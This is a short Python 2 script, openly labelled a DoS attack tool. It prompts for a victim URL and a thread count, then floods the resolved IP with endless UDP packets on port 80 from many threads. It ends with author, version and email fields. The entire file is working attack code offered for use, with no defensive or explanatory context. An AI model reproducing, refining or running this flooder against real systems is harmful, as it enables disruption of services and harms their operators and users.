#!/usr/bin/python
import time, socket, sys, thread

victim_addr = raw_input("Enter The URL [ENTER]: ")
thread_count = input("Enter the counts of thread you wish to lunch [ENTER]: ")
victim_ip = socket.gethostbyname(victim_addr)

UDP_PORT = 80
MESSAGE = "DOS ATTACK!!!"
print "UDP target IP:", victim_ip
print "UDP target port:", UDP_PORT
time.sleep(3)

def dos(i):
	while True:	
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			sock.sendto(MESSAGE, (victim_ip, UDP_PORT))
			print "Packet Sent"
		
for i in xrange(thread_count):
	try:
	 thread.start_new_thread( dos , ("Thread-"+str(i),) )
	except KeyboardInterrupt:
			sys.exit(0)
while 1:
  pass
__Author__ = 'mjoker23'
__Version__ = '1.0'
__Email__ = 'mjoker22mjoker22@gmail.com'
